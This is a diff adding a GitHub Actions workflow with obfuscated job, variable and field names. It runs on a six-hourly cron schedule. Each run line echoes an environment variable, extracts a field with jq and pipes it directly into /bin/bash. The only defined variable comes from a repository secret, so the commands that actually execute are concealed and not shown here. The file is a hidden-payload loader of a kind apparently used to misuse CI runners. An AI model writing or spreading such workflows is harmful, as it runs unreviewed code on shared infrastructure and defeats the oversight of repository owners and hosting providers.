@@ -1,0 +1,31 @@
+name: linchengsheng6715
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: linchengsheng6715
+        env:
+          fq1562: ${{ secrets.fq1562 }}
+        run: |
+          echo $fq1562 | jq -r .ngin549 | /bin/bash
+          echo $whiw21 | jq -r .l101 | /bin/bash
+          echo $x47 | jq -r .zbisr6391 | /bin/bash
+          echo $mq35465 | jq -r .zohgn5751 | /bin/bash
+          echo $kkpx78592 | jq -r .ohnw2738 | /bin/bash
+          echo $lzjc45 | jq -r .rynpy41594 | /bin/bash
+          echo $w780 | jq -r .ca1 | /bin/bash
+          echo $ed35 | jq -r .upq55429 | /bin/bash
+          echo $bnn96 | jq -r .qhqyd34262 | /bin/bash
+          echo $wm1 | jq -r .ogbl2 | /bin/bash
+          echo $ml349 | jq -r .rq0781 | /bin/bash
+          echo $axi850 | jq -r .colzy201 | /bin/bash
+          echo $o99 | jq -r .ypijv592 | /bin/bash
+
